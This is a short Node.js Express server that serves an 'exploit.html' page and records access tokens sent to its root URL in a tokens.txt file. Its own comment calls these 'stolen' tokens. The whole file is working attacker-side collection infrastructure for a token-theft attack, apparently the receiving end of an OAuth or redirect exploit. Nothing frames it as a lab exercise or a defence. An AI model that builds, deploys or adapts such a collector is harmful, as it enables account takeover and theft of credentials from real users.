const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Ensure the 'tokens.txt' file exists before logging
const tokenLogFile = path.join(__dirname, 'tokens.txt');

// Check if the file exists; if not, create it
if (!fs.existsSync(tokenLogFile)) {
    fs.writeFileSync(tokenLogFile, '', 'utf8');
}

// Route to serve exploit.html
app.get('/exploit', (req, res) => {
    const exploitPath = path.join(__dirname, 'exploit.html');
    
    // Serve exploit.html
    res.sendFile(exploitPath, (err) => {
        if (err) {
            console.error('Error serving exploit.html:', err);
            res.status(500).send('Error serving exploit.html');
        }
    });
});

// Log stolen token if present
app.get('/', (req, res) => {
    const accessToken = req.query.access_token;

    if (accessToken) {
        const log = `[${new Date().toISOString()}] Token: ${accessToken}\n`;

        // Append the token to the 'tokens.txt' file
        fs.appendFileSync(tokenLogFile, log, 'utf8');
        console.log(log);
    }

    res.send('Token received (if present).');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
